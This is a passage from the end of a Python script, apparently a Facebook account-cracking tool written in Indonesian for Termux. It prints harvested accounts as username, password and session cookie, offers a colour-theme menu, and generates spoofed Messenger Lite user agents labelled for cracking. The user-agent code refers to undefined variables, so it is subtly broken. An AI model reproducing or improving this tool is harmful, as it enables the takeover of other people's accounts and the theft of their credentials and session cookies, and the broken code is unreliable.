			exit()
		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
		prints(Panel(f"""{K2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
		for akun in totalhasil:
			user = akun.split("|")[0]
			pw = akun.split("|")[1]
			tree = Tree(" ",guide_style=f"{color_panel}")
			if folder=="OK":
				cookie = akun.split("|")[2]
				tree.add(f"\r{H2}{user}|{pw}{K2} ")
				tree.add(Panel(f"{H2}{cookie}{K2}",style=f"{color_panel}"))
			else:
				tree.add(f"\r{M2}{user}|{pw}{K2} ")
			prints(tree)
		prints(Panel(f"""{K2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
		exit()
		
	###----------[ GANTI WARNA TEMA ]---------- ###
	def ganti_tema(self):
		prints(Panel(f"""{K2}[{color_text}01{K2}]. ganti warna tema merah  [{color_text}06{K2}]. ganti warna tema pink
[{color_text}02{K2}]. ganti warna tema hijau  [{color_text}07{K2}]. ganti warna tema cyan
[{color_text}03{K2}]. ganti warna tema kuning [{color_text}08{K2}]. ganti warna tema putih
[{color_text}04{K2}]. ganti warna tema biru   [{color_text}09{K2}]. ganti warna tema orange
[{color_text}05{K2}]. ganti warna tema ungu   [{color_text}10{K2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}pilih tema : ")
		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
		elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
		elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
		elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
		elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
		elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
		elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
		elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
		elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
		open("data/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
		prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=80,padding=(0,6),style=f"{color_panel}"))
		sys.exit()
			
	###----------[ TAMPILKAN COOKIE ]---------- ###
	def tampil_cookie(self):
		now = datetime.now()
		hari = now.day+int(30)
		if hari > 30:hari = hari-30
		bulan = now.month+1
		if bulan > 12:bulan = bulan-12
		if now.month+1 > 12:tahun = now.year+1
		data = date(year=tahun,month=bulan,day=hari)
		aktif = data.strftime("%d %B %Y")
		console.print(f" {H2}• {K2}aktif sampai : {aktif}")
		prints(Panel(f"""{M2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
		sys.exit()
		
###----------[ BAGIAN SESSION HEADERS DAN USER AGENT ]---------- ###
class Session:
	
	###----------[ GENERATE USER AGENT CRACK ]---------- ###
	def generate_ugent(self):
		versi_android = random.randint(4,12)
		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		versi_app = random.randint(111111111,999999999)
		device = random.choice(["SM-J320FN Build/LMY47V","NEO-X7-216A Build/XRN68H","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09","5.1.1; F1 Build/LMY47V"])
		density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(density)+";]"
		return ugent
if __name__=="__main__":
	try:os.system('git pull')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass	
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("data")
	except:pass
	Menu().menu()
